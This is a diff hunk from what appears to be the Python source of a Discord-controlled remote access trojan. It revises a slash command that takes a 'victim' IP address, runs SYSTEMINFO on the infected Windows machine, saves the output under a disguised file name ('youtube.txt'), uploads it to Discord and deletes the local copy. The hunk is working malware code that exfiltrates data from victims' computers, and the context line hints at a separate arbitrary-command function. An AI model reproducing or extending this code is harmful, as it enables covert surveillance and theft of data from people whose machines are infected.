@@ -149,20 +149,27 @@ async def command(ctx, victim):
         os.chdir(original_dir)   
   
   
-@client.slash_command(description="Sends General System Information")
-async def systeminfo(ctx, victim):
+@client.slash_command(
+    name="systeminfo",
+    description="Sends General System Information",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def command(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
+        
         subprocess.run(
             f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
             shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE,
+            stdin=subprocess.PIPE
         )
         await ctx.followup.send(
-            embed=discord.Embed(title="General System Info:", color=0x0081FA), 
-            file=discord.File(nr_working + "\\youtube.txt", filename="General Output.txt"), 
+            embed=discord.Embed(title="System Information:", color=0x0081FA), 
+            file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
         )
         os.remove(nr_working + "\\youtube.txt")
 
